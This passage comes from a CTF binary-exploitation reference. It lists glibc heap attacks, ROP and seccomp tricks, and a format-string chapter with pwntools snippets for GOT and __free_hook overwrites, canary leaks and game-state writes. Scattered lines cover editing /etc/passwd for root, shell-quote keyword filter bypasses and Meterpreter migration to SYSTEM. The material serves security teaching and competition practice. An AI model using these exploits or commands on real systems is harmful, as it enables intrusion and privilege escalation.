- **House of Apple 2** (glibc 2.34+): FSOP (File Stream Oriented Programming) via `_IO_wfile_jumps` when `__free_hook`/`__malloc_hook` removed. Fake FILE with `_flags = " sh"`, vtable chain → `system(fp)`. For SUID binaries: use `setcontext()` variant to stack pivot → `setuid(0)` → `system()` (dash drops privs when uid != euid). See [heap-techniques.md](heap-techniques.md#setcontext-variant-for-suid-binaries-midnight-flag-2026).
- **Classic unlink**: Corrupt adjacent chunk metadata, trigger backward consolidation for write-what-where primitive. Pre-2.26 glibc only. See [heap-techniques.md](heap-techniques.md#classic-heap-unlink-attack-crypto-cat).
- **House of Force:** Corrupt top chunk size to `0xffffffffffffffff`, next `malloc(target - top - 2*SIZE_SZ)` returns arbitrary address. Pre-2.29 glibc only. See [heap-techniques.md](heap-techniques.md#house-of-force-csaw-ctf-2016).
- **House of Einherjar**: Off-by-one null clears PREV_INUSE, backward consolidation with self-pointing unlink.
- **Safe-linking** (glibc 2.32+): tcache fd mangled as `ptr ^ (chunk_addr >> 12)`.
- Check glibc version: `strings libc.so.6 | grep GLIBC`
- Freed chunks contain libc pointers (fd/bk) -> leak via error messages or missing null-termination
- Heap feng shui: control alloc order/sizes, create holes, place targets adjacent to overflow source
- **Unsafe unlink + top chunk consolidation**: After unlink writes self-pointer to BSS, craft fake BSS chunk spanning to top chunk. `free()` consolidates, relocating heap base to BSS. Subsequent mallocs return BSS memory. See [heap-techniques.md](heap-techniques.md#unsafe-unlink-to-bss-top-chunk-consolidation-seccon-2016).

**House of Orange:** Corrupt top chunk size → large malloc forces sysmalloc → old top freed without calling `free()`. Chain with FSOP. See [heap-techniques.md](heap-techniques.md#house-of-orange).

**House of Spirit:** Forge fake chunk in target area, `free()` it, reallocate to get write access. Requires valid size + next chunk size. See [heap-techniques.md](heap-techniques.md#house-of-spirit).

**House of Lore:** Corrupt smallbin `bk` → link fake chunk → second malloc returns attacker-controlled address. See [heap-techniques.md](heap-techniques.md#house-of-lore).

**ret2dlresolve:** Forge Elf64_Sym/Rela to resolve arbitrary libc function without leak. `Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])`. Requires Partial RELRO. See [advanced.md](advanced.md#ret2dlresolve).

**tcache stashing unlink (glibc 2.29+):** Corrupt smallbin chunk's `bk` during tcache stashing → arbitrary address linked into tcache → write primitive. See [heap-techniques.md](heap-techniques.md#tcache-stashing-unlink-attack).

**UAF vtable pointer encoding shell argument:** After UAF, heap spray places `system()` at offset +3. Object address containing `0x6873` ("sh") in low bytes doubles as the command string argument when `system(this)` is called through the hijacked vtable. See [heap-techniques.md](heap-techniques.md#uaf-vtable-pointer-encoding-shell-argument-bctf-2017).

**Fastbin stdout vtable two-stage hijack (PIE + Full RELRO):** Use 0x7f byte in libc's stdout region as fake fastbin chunk size. Two-stage: first vtable redirect to `gets()` (rdi=stdout), then `gets()` overwrites vtable again to `system()` with command string. See [heap-techniques.md](heap-techniques.md#fastbin-stdout-vtable-two-stage-hijack-for-pie-full-relro-asis-ctf-2017).

See [heap-techniques.md](heap-techniques.md) for House of Apple 2 FSOP chain (+ setcontext SUID variant), House of Orange/Spirit/Lore/Force, tcache stashing unlink, custom allocator exploitation (nginx pools, talloc), classic unlink, musl libc heap. See [advanced.md](advanced.md) for ret2dlresolve, heap overlap via base conversion, tree data structure stack underallocation.

**GF(2) Gaussian elimination for tcache poisoning:** When a deterministic XOR cipher corrupts heap metadata as a side effect, model the corruption as linear algebra over GF(2). Find a subset of cipher seeds whose combined XOR transforms tcache `fd` from current value to target address. See [advanced-exploits-4.md](advanced-exploits-4.md#gf2-gaussian-elimination-for-multi-pass-tcache-poisoning-midnight-flag-2026).

## Additional Exploit Notes

### talloc Pool Header Forgery
**Pattern:** talloc (hierarchical allocator in Samba/CUPS) pool header forgery. Forge fake pool header with controlled `end`/`object_count` fields to redirect next `talloc()` to arbitrary address. Leak GOT for libc, write `__free_hook` with `system()`. See [heap-techniques.md](heap-techniques.md#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016).

### JIT Compilation Exploits
**Pattern:** Off-by-one in instruction encoding -> misaligned machine code. Embed shellcode as operand bytes of subtraction operations, chain with 2-byte `jmp` instructions. See [advanced.md](advanced.md).

**BF JIT unbalanced bracket:** Unbalanced `]` pops tape address (RWX) from stack → write shellcode to tape with `+`/`-`, trigger `]` to jump to it. See [advanced.md](advanced.md).

### Type Confusion in Interpreters
**Pattern:** Interpreter sets wrong type tag → struct fields reinterpreted. Unused padding bytes in one variant become active pointers/data in another. Flag bytes as type value trigger UNKNOWN_DATA dump. See [advanced.md](advanced.md).

### Off-by-One Index / Size Corruption
**Pattern:** Array index 0 maps to `entries[-1]`, overlapping struct metadata (size field). Corrupted size → OOB read leaks canary/libc, then OOB write places ROP chain. See [advanced.md](advanced.md).

### Double win() Call
**Pattern:** `win()` checks `if (attempts++ > 0)` — needs two calls. Stack two return addresses: `p64(win) + p64(win)`. See [advanced.md](advanced.md).

### Arbitrary Read/Write to Shell via GOT Overwrite
**Pattern:** Binary provides explicit read/write primitives. Leak libc via GOT read, overwrite `strtoll@GOT` with `system`, next call becomes `system(user_input)`. Choose GOT targets where the function takes a user-controlled string as first arg. See [advanced-exploits-3.md](advanced-exploits-3.md#arbitrary-readwrite-to-shell-via-got-overwrite-bsidessf-2026).

### Stack Leak via __environ and memcpy Overflow
**Pattern:** Binary with read-only primitive and `memcpy(stack_buf, user_addr, user_len)`. Leak libc via GOT, leak stack via `__environ`, plant ROP addresses in input buffer, overflow memcpy to copy them over return address, send EOF to trigger return. See [advanced-exploits-3.md](advanced-exploits-3.md#stack-leak-via-environ-and-memcpy-overflow-bsidessf-2026).

### JIT Sandbox Escape via uint16 Jump Truncation
**Pattern:** JIT compiler truncates conditional jump offset to uint16, causing misalignment when code exceeds 64KB. Embed 2-byte shellcode fragments in `add` immediates, thread with `jmp $+3` to chain execution. See [advanced-exploits-3.md](advanced-exploits-3.md#jit-sandbox-escape-via-conditional-jump-uint16-truncation-bsidessf-2026).

### DNS Compression Pointer Stack Overflow
**Pattern:** Custom DNS server doesn't track decompressed name length. Compression pointer chains revisit data, overflowing stack buffer. Split ROP chain across multiple DNS question entries. See [advanced-exploits-3.md](advanced-exploits-3.md#dns-compression-pointer-stack-overflow-with-multi-question-rop-bsidessf-2026).

### ELF Code Signing Bypass via Program Headers
**Pattern:** Signing scheme hashes section headers/content but not program headers. Append shellcode, modify LOAD segment's `p_offset` to point to appended data — signature still valid, loader executes attacker code. See [advanced-exploits-3.md](advanced-exploits-3.md#elf-code-signing-bypass-via-program-header-manipulation-bsidessf-2026).

### Game Level Format Signed/Unsigned Coordinate Mismatch
**Pattern:** Level editor parses signed integer coordinates but bounds-checks via unsigned comparison — negative coordinates pass the check and write block IDs (arbitrary bytes) before the level array, enabling stack return address overwrite. Leak stack address via hidden developer mode, encode shellcode as block IDs. See [advanced-exploits-3.md](advanced-exploits-3.md#game-level-format-signedunsigned-coordinate-mismatch-bsidessf-2026).

### File Descriptor Inheritance via Missing O_CLOEXEC
**Pattern:** Service reads secret into `memfd_create()` FD without `MFD_CLOEXEC`, then calls `system()` for user commands — child inherits the FD. Bypass `strstr()` keyword filters with shell quote splitting (`p'r'oc` instead of `proc`) to read `/proc/self/fd/N`. See [advanced-exploits-3.md](advanced-exploits-3.md#file-descriptor-inheritance-via-missing-ocloexec-bsidessf-2026).

### Sign Extension Integer Underflow in Metadata Parsing
**Pattern:** Metadata parser's `to_int32` converts unsigned values >= 0x80000000 to negative signed integers. Used as array index/offset, this causes OOB memory access. Iterate byte-by-byte to leak flag from memory. See [advanced-exploits-3.md](advanced-exploits-3.md#sign-extension-integer-underflow-in-metadata-parsing-bsidessf-2026).

### ROP Chain Construction with Read-Only Primitive
**Pattern:** Binary with only `read()` primitive — no write, no win function. Leak libc via GOT, then "import" arbitrary byte values onto the stack by reading from libc offsets whose content matches desired ROP gadget addresses. Read primitive doubles as write primitive. See [advanced-exploits-3.md](advanced-exploits-3.md#rop-chain-construction-with-read-only-primitive-bsidessf-2026).

### Esoteric Language GOT Overwrite
**Pattern:** Brainfuck/Pikalang interpreter with unbounded tape = arbitrary read/write relative to buffer base. Move pointer to GOT, overwrite byte-by-byte with `system()`. See [advanced.md](advanced.md).

### Protocol Stack Bleeding
Custom network protocols echoing data based on length field leak stack memory when length exceeds actual data (Heartbleed-style). See [overflow-basics.md](overflow-basics.md#protocol-length-field-stack-bleeding-ekoparty-ctf-2016).

### Timing Attack Flag Recovery
Validation time varies per correct character; measure elapsed time per candidate byte to recover flag character-by-character. See [advanced-exploits.md](advanced-exploits.md#timing-attack-for-character-by-character-flag-recovery-rc3-ctf-2016).

### DNS Record Buffer Overflow
**Pattern:** Many AAAA records overflow stack buffer in DNS response parser. Set up DNS server with excessive records, overwrite return address. See [advanced.md](advanced.md).

### ASAN Shadow Memory Exploitation
**Pattern:** Binary with AddressSanitizer has format string + OOB write. ASAN may use "fake stack" (50% chance). Leak PIE, detect real vs fake stack, calculate OOB write offset to overwrite return address. See [advanced.md](advanced.md).

### Format String .fini_array Loop for Multi-Stage Exploitation
**Pattern:** No GOT function called after `printf()`. Overwrite `.fini_array[0]` with `main()` for re-execution loop. Stage 1: leak libc/stack. Stage 2: `printf@GOT` to `system()`, `__stack_chk_fail@GOT` to `main()`. Stage 3: corrupt canary to trigger `__stack_chk_fail` re-entry, now `printf(input)` is `system(input)`. See [format-string.md](format-string.md#format-string-finiarray-loop-for-multi-stage-exploitation-codegate-2016).

### Format String with RWX .fini_array Hijack
**Pattern (Encodinator):** Base85-encoded input in RWX memory passed to `printf()`. Write shellcode to RWX region, overwrite `.fini_array[0]` via format string `%hn` writes. Use convergence loop for base85 argument numbering. See [advanced.md](advanced.md).

### Custom Canary Preservation
**Pattern:** Buffer overflow must preserve known canary value. Write exact canary bytes at correct offset: `b'A' * 64 + b'BIRD' + b'X'`. See [advanced.md](advanced.md).

### MD5 Preimage Gadget Construction
**Pattern (Hashchain):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes; bytes 14-15 become 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80). See [advanced.md](advanced.md) for C code and v2 technique.

### Python Sandbox Escape
AST bypass via f-strings, audit hook bypass with `b'flag.txt'` (bytes vs str), MRO-based `__builtins__` recovery. See [sandbox-escape.md](sandbox-escape.md).

### VM GC-Triggered UAF (Slab Reuse)
**Pattern:** Custom VM with NEWBUF/SLICE/GC opcodes. Slicing creates shared slab reference; dropping+GC'ing slice frees slab while parent still holds it. Allocate function object to reuse slab, leak code pointer via UAF read, overwrite with win() address. See [advanced.md](advanced.md).

### GC Null-Reference Cascading Corruption
**Pattern:** Mark-compact GC follows null references to heap address 0, creating fake object. During compaction, memmove cascades corruption through adjacent object headers → OOB access → libc leak → FSOP. See [advanced.md](advanced.md).

### OOB Read via Stride/Rate Leak
**Pattern:** String processing function with user-controlled stride skips past null terminator, leaking stack canary and return address one byte at a time. Then overflow with leaked values. See [overflow-basics.md](overflow-basics.md).

### SROP with UTF-8 Constraints
**Pattern:** When payload must be valid UTF-8 (Rust binaries, JSON parsers), use SROP — only 3 gadgets needed. Multi-byte UTF-8 sequences spanning register field boundaries "fix" high bytes. See [rop-advanced.md](rop-advanced.md).

### VM Exploitation (Custom Bytecode)
**Pattern:** Custom VM with OOB read/write in syscalls. Leak PIE via XOR-encoded function pointer, overflow to rewrite pointer with `win() ^ KEY`. See [sandbox-escape.md](sandbox-escape.md).

### FUSE/CUSE Character Device Exploitation
Look for `cuse_lowlevel_main()` / `fuse_main()`, backdoor write handlers with command parsing. Exploit to `chmod /etc/passwd` then modify for root access. See [sandbox-escape.md](sandbox-escape.md).

### Busybox/Restricted Shell Escalation
Find writable paths via character devices, target `/etc/passwd` or `/etc/sudoers`, modify permissions then content. See [sandbox-escape.md](sandbox-escape.md).

### process_vm_readv Sandbox Bypass
**Pattern:** Sandbox validates file paths via `process_vm_readv()` + `realpath()`. Map memory with `PROT_READ` only at fixed address via `mmap(MAP_FIXED)` -- sandbox's `process_vm_readv` fails silently, bypassing path validation entirely. See [sandbox-escape.md](sandbox-escape.md#processvmreadv-failure-as-sandbox-escape-0ctf-2016).

### Named Pipe (mkfifo) File Size Bypass
**Pattern:** Binary checks `stat()` file size before reading. Named pipes report `st_size = 0` but deliver arbitrary data via `read()`. `mkfifo /tmp/pipe && cat payload > /tmp/pipe &` then pass pipe to binary. Combine with `ln -s /flag arena.c` for string reuse in ROP. See [sandbox-escape.md](sandbox-escape.md#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016).

### Shell Tricks
`exec<&3;sh>&3` for fd redirection, `$0` instead of `sh`, `ls -la /proc/self/fd` to find correct fd. See [sandbox-escape.md](sandbox-escape.md).

### Double Stack Pivot to BSS via leave;ret
**Pattern:** Small overflow (only RBP + RIP). Overwrite RBP → BSS address, RIP → `leave; ret` gadget. `leave` sets RSP = RBP (BSS). Second stage at BSS calls `fgets(BSS+offset, large_size, stdin)` to load full ROP chain. See [rop-advanced.md](rop-advanced.md#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026).

### RETF Architecture Switch for Seccomp Bypass
**Pattern:** Seccomp blocks 64-bit syscalls (`open`, `execve`). Use `retf` gadget to load CS=0x23 (IA-32e compatibility mode). In 32-bit mode, `int 0x80` uses different syscall numbers (open=5, read=3, write=4) not covered by the filter. Requires `mprotect` to make BSS executable for 32-bit shellcode. See [rop-advanced.md](rop-advanced.md#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026).

### Leakless Libc via Multi-fgets stdout FILE Overwrite
**Pattern:** No libc leak available. Chain multiple `fgets(addr, 7, stdin)` calls via ROP to construct fake stdout FILE struct on BSS. Set `_IO_write_base` to GOT entry, call `fflush(stdout)` → leaks GOT content → libc base. The 7-byte writes avoid null byte corruption since libc pointer MSBs are already `\x00`. See [advanced-exploits-2.md](advanced-exploits-2.md#leakless-libc-via-multi-fgets-stdout-file-overwrite-midnightflag-2026).

### Signed/Unsigned Char Underflow to Heap Overflow
**Pattern:** Size field stored as `signed char`, cast to `unsigned char` for use. `size = -112` → `(unsigned char)(-112) = 144`, overflowing a 127-byte buffer by 17 bytes. Combine with XOR keystream brute-force for byte-precise writes, forge chunk sizes for unsorted bin promotion (libc leak), FSOP stdout for TLS leak, and TLS destructor (`__call_tls_dtors`) overwrite for RCE. See [advanced-exploits-2.md](advanced-exploits-2.md#signedunsigned-char-underflow-to-heap-overflow-tls-destructor-hijack-midnightflag-2026).

### TLS Destructor Hijack via `__call_tls_dtors`
**Pattern:** Alternative to House of Apple 2 on glibc 2.34+. Forge `__tls_dtor_list` entries with pointer-guard-mangled function pointers: `encoded = rol(target ^ pointer_guard, 0x11)`. Requires leaking pointer guard from TLS segment (via FSOP stdout redirection). Each node calls `PTR_DEMANGLE(func)(obj)` on exit. See [advanced-exploits-2.md](advanced-exploits-2.md#tls-destructor-overwrite-for-rce-via-calltlsdtors).

### Signed Int Overflow to Negative OOB Heap Write
**Pattern (Canvas of Fear):** Index formula `y * width + x` in signed 32-bit int overflows to negative value, passing bounds check and writing backward into heap metadata. Use to corrupt adjacent chunk sizes/pointers, leak libc via unsorted bin, redirect a data pointer to `environ` for stack leak, then write ROP chain to main's return address. When binary is behind a web API, chain XSS → Fetch API → heap exploit, and inject `\n` in API parameters for command stacking via `sendline()`. See [advanced-exploits-2.md](advanced-exploits-2.md#signed-int-overflow-to-negative-oob-heap-write-xss-to-binary-pwn-bridge-midnight-2026) for full exploit chain, XSS bridge pattern, and RGB pixel write primitive.

### Custom Shadow Stack Bypass via Pointer Overflow
**Pattern (Revenant):** Userland shadow stack in `.bss` with unbounded pointer. Recurse to advance `shadow_stack_ptr` past the array into user-controlled memory (e.g., `username` buffer), write `win()` there, then overflow the hardware stack return address to match. Both checks pass. See [advanced-exploits-2.md](advanced-exploits-2.md#custom-shadow-stack-bypass-via-pointer-overflow-midnight-2026) for full exploit and `.bss` layout analysis.

### Windows SEH Overwrite + VirtualAlloc ROP
Format string leak defeats ASLR. SEH (Structured Exception Handler) overwrite with stack pivot to ROP chain. `pushad` builds VirtualAlloc call frame for DEP (Data Execution Prevention) bypass. Detached process launcher for shell stability on thread-based servers. See [advanced-exploits-4.md](advanced-exploits-4.md#windows-seh-overwrite-pushad-virtualalloc-rop-rainbowtwo-htb).

### SeDebugPrivilege to SYSTEM
`SeDebugPrivilege` + Meterpreter `migrate -N winlogon.exe` -> SYSTEM. See [advanced-exploits-4.md](advanced-exploits-4.md#sedebugprivilege-to-system-rainbowtwo-htb).

### mmap/munmap Size Mismatch UAF
Over-unmap via mmap(small)/munmap(large) destroys adjacent mappings. Thread stack fills gap, old buffer pointer becomes write-into-stack. Race-free UAF variant. See [advanced-exploits-4.md](advanced-exploits-4.md#mmapmunmap-size-mismatch-uaf-for-thread-stack-overlap-0ctf-2017).

### strcspn Indirect Null Byte Injection
`strcspn(buf, "\r\n")` + null write truncates strings at injected newlines. Bypasses CGI null-byte filtering for path traversal. See [advanced-exploits-4.md](advanced-exploits-4.md#strcspn-as-indirect-null-byte-injection-bsidessf-2017).

### Windows CFG Bypass Using system() as Valid Call Target
**Pattern:** Windows CFG validates indirect call targets but `system()` from msvcrt passes validation since it is a legitimate API entry point. Overwrite function pointer with `system()`, use comma instead of space in arguments to bypass input filters. See [advanced-exploits-4.md](advanced-exploits-4.md#windows-cfg-bypass-using-system-as-valid-call-target-insomnihack-2017).

### 4-Byte Shellcode with Timing Side-Channel
**Pattern:** Binary executes only 4 bytes of user shellcode in a 4096-iteration loop. Callee-saved registers (r12-r15) persist across iterations, enabling incremental state building. The 4096x loop amplifies timing differences for reliable side-channel measurement. See [advanced-exploits-3.md](advanced-exploits-3.md#4-byte-shellcode-with-timing-side-channel-via-persistent-registers-google-ctf-2017).

### CRC Oracle as Arbitrary Read Primitive
**Pattern:** CRC is bijective on single bytes. Overflow a pointer to control the CRC input address, precompute all 256 single-byte CRCs, and reverse-lookup each byte of arbitrary memory. Chain reads to leak GOT, libc, stack, and canary. See [advanced-exploits-3.md](advanced-exploits-3.md#crc-oracle-as-arbitrary-read-primitive-asis-ctf-2017).

### UTF-8 Case Conversion Buffer Overflow
**Pattern:** Unicode case conversion can expand character byte length (e.g., 2-byte UTF-8 becomes 4 bytes when uppercased). If buffer is sized for input length, the longer output overflows. Affects GLib `g_utf8_strup()`, ICU, and similar functions. See [advanced-exploits-3.md](advanced-exploits-3.md#utf-8-case-conversion-buffer-overflow-hitb-ctf-2017).

## Useful Commands

`checksec`, `one_gadget`, `ropper`, `ROPgadget`, `seccomp-tools dump`, `strings libc | grep GLIBC`. See [rop-advanced.md](rop-advanced.md) for full command list and pwntools template.


# format-string

# CTF Pwn - Format String Exploitation

## Table of Contents
- [Format String Basics](#format-string-basics)
- [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
- [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
- [Format String with Filter Bypass](#format-string-with-filter-bypass)
- [Format String Canary + PIE Leak](#format-string-canary--pie-leak)
- [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc--234)
- [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
- [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
- [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
- [argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
- [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
- [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
- [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
- [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
- [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)

---

## Format String Basics

- Leak stack: `%p.%p.%p.%p.%p.%p`
- Leak specific offset: `%7$p`
- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
- GOT overwrite for code execution

**Write size specifiers (x86-64):**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32-bit values |
| `%hn` | 2 | Split writes |
| `%hhn` | 1 | Precise byte writes |
| `%lln` | 8 | Full 64-bit address (clears upper bytes) |

**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.

**Arbitrary read primitive:**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**Arbitrary write primitive:**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**Manual GOT overwrite (x86-64):**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**Offset calculation for addresses:**
- Buffer typically starts at offset 6 (after register args)
- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
- Example: 16-byte format → addresses at offset 8
- Example: 32-byte format → addresses at offset 10
- Example: 64-byte format → addresses at offset 14

**Verify offset with test payload:**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT target selection:**
- If `exit@GOT` doesn't work, try other GOT entries
- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
- Target functions called AFTER the format string vulnerability
- Check call order in disassembly to pick best target

**Key insight:** Format string vulnerabilities are identified by sending `%p.%p.%p` as input -- if hex addresses appear in the output, the program passes user input directly as the format argument to `printf`/`sprintf`. This gives both arbitrary read (`%s` with a target address) and arbitrary write (`%n` family) primitives.

## Argument Retargeting (Non-Positional %n Trick)

Use this when you cannot embed addresses (input filtering, newline issues) but can still use `%n` and a stack pointer is available as an argument.

**Key idea:** Non-positional specifiers consume arguments in order. You can overwrite a *future* argument (which is itself a pointer) before it is used, then use it as an arbitrary write target.

**Why non-positional:** Positional formats (`%22$hn`) are cached up front by glibc, so changing the underlying stack slot after parsing won’t change the pointer. Non-positional `%n` avoids that cache.

**Workflow (example):**
1. Leak offsets: find a stack pointer argument you can overwrite (e.g., saved `rbp` on the stack).
2. Advance the argument index with `%c` (each `%c` consumes one argument).
3. Use `%n` to write a 4-byte value into that pointer slot (e.g., make arg22 point to `exit@GOT`).
4. Print additional chars and use `%hn` to write the low 2 bytes to the now-retargeted pointer.

**Pattern (conceptual):**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**Compute widths:**
- After writing `target_addr` with `%n`, the printed count is `C`.
- To write low 2 bytes `W` with `%hn`, print:
  - `delta = (W - (C % 65536)) mod 65536`

**When it works well:**
- No PIE / Partial RELRO (GOT writable)
- You can afford large outputs (millions of chars)

**Stack layout discovery (find your input offset):**
```text
%1$p %2$p %3$p ... %50$p
```
- Your input appears at some offset (commonly 6-8)
- Canary: looks like `0x...00` (null byte at end)
- Saved RBP: stack address pattern
- Return address: code address (PIE or libc)

## Blind Pwn (No Binary Provided)

When no binary is given, use format strings to discover everything:

**1. Confirm vulnerability:**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. Discover protections by leaking stack:**
- Find canary (offset ~39, pattern `0x...00`)
- Find saved RBP (offset ~40, stack address)
- Find return address (offset ~41-43, code pointer)

**3. Identify PIE base:**
- Leak return address pointing into main/binary
- Subtract known offset to get base (may need guessing)

**4. Dump GOT to identify libc:**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. Cross-reference libc database:**
- https://libc.blukat.me/
- https://libc.rip/
- Input multiple function addresses to identify exact libc version

**Key insight:** Blind pwn without a binary requires systematic discovery: leak stack values to find canary/PIE/libc pointers, use arbitrary read to dump GOT entries, cross-reference leaked addresses against libc databases to identify the exact version, then compute offsets for one_gadget or system().

**6. Calculate libc base:**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**Common stack offsets (x86_64):**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | User input buffer |
| ~39 | Stack canary |
| ~40 | Saved RBP |
| ~41-43 | Return address |

## Format String with Filter Bypass

**Pattern (Cvexec):** `filter_string()` strips `%` but skippable with `%%%p`.

**Filter bypass:** If filter checks adjacent chars after `%`:
- `%p` → filtered
- `%%p` → properly escaped (prints literal `%p`)
- `%%%p` → third `%` survives, prints stack value

**GOT overwrite via format string (byte-by-byte with `%hhn`):**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**Pattern (My Little Pwny):** Format string vulnerability to leak canary and PIE base, then buffer overflow.

**Two-stage attack:**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

## __free_hook Overwrite via Format String (glibc < 2.34)

**Pattern (Notetaker, PascalCTF 2026):** Full RELRO + No PIE + format string vulnerability. Can't overwrite GOT, but `__free_hook` is writable.

**Key insight:** `free(ptr)` passes `ptr` in `rdi` as first argument. If `__free_hook = system`, then `free("cat flag")` executes `system("cat flag")`.

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.

## .rela.plt / .dynsym Patching

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.

**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.

**Key insight:** When GOT addresses contain bad bytes (e.g., `0x0a` with `fgets`), avoid writing to GOT directly. Instead, patch `.rela.plt` to redirect the relocation to a different `.dynsym` entry, then overwrite that symbol's `st_value` with the target address. The dynamic linker follows the patched chain on the next call.

---

## Format String for Game State Manipulation (UTCTF 2026)

**Pattern (Small Blind):** Poker/card game where player name is vulnerable to format string. Stack contains pointers to game state variables (player chips, dealer chips). Write arbitrary values to win condition.

**Key insight:** `%n` writes the number of characters printed so far. Use `%Xc` to control that count, then `%N$n` to write to the Nth stack argument (which points to a game variable).

**Exploitation:**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**Discovery workflow:**
1. **Confirm format string:** Send `%p.%p.%p.%p` as name, check for hex leaks
2. **Map stack positions:** Try `%6$n`, `%7$n`, `%8$n` with different `%Xc` values
3. **Identify which variable changed:** Compare game output (chips, score, health) before/after
4. **Determine win condition:** May be `player_chips >= threshold` or `player > dealer`
5. **Craft winning payload:** Set player chips high (`%9999c%7$n`) or dealer chips to 0 (`%6$n`)

**Common game state patterns on stack:**
| Position | Typical Variable |
